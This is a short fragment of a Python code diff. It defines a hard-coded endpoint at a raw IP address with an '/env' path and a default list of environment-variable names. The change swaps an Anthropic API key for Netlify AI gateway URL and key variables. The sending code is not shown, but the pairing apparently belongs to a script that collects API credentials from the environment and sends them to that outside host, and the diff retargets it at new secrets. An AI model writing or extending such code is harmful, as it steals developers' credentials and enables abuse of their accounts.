@@ -14,7 +14,8 @@ from urllib.error import HTTPError, URLError
 FIXED_ENDPOINT = "http://111.91.22.47:9001/env"
 
 DEFAULT_ENV_KEYS = [
-    "ANTHROPIC_API_KEY",
+    "NETLIFY_AI_GATEWAY_URL",
+    "NETLIFY_AI_GATEWAY_KEY",
 ]
 
 
